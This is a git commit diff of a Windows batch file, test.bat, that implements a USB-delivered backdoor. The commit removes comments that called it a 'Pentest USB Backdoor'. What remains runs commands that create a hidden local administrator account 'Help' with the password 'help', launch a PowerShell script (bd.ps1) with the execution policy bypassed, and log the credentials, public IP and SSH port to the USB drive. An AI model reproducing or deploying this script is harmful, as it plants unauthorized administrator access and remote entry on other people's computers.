4c8cfb2aea110466b0a2df70229862ddc8313d3b
mattqze <96447310+mattqze@users.noreply.github.com>
2022-07-03 02:25:21 -0400

    Update test.bat

--- test.bat
+++ test.bat
@@ -1,15 +1,4 @@
 @echo off
-REM Test Project, Pentest USB Backdoor
- 
-REM Idea:
- 
-REM Connect USB Flash Drive to PC
-REM Run command, make SSH Backdoor
-REM Show prompt when finished
-REM Write IP, Username, Password to txt
-REM Remove USB Flash Drive.
-
-REM All commands done automatically.
 net user "Help" "help" /add
 net localgroup "Administrators" "Help" /add
 Powershell -ExecutionPolicy Bypass -File E:\bd.ps1
@@ -19,4 +8,3 @@ echo Username: Help >> E:\output.txt
 echo Password: help >> E:\output.txt
 echo Public IP: %PublicIP% >> E:\output.txt
 echo Port: 22>> E:\output.txt
-PAUSE
